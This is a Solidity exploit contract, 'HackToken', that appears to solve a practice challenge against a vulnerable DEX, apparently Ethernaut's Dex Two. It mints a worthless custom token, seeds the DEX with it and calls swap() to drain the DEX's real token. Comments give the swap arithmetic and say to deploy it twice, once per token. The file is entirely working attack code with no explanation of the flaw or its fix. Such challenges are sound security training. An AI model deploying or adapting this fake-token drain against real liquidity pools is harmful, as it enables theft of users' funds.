pragma solidity ^0.8;

/* sino, tambien importara IERC20 y demas "father contracts" */
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/* deploy twice the contract, for token1 and for token2 */

contract HackToken is ERC20 {
    IDex immutable dex;
    IERC20 private immutable token1;

    uint public _bal;

    constructor(
        IDex _dex,
        string memory name_,
        string memory symbol_
    ) ERC20(name_, symbol_) {
        dex = _dex;
        token1 = IERC20(
            dex.token2()
        ); /* @remid unique change --> token1 and token2 */

        _mint(address(this), 1000 ether);
        _mint(address(_dex), 100 ether);

        /* approve dex2 to swap */
        _approve(address(this), address(_dex), type(uint256).max);
    }

    function drainToken() external {
        /* math for swap
        100 = token2 amount in * token1 balance / token2 balance
        100 = token2 amount in * 100 / 100
        100  = token2 amount in */
        dex.swap(address(this), address(token1), 100 ether);

        _bal = token1.balanceOf(address(this));
        // require(_bal == 0, "No se han drenado todos los tokens");
    }
}

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function getSwapAmount(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}
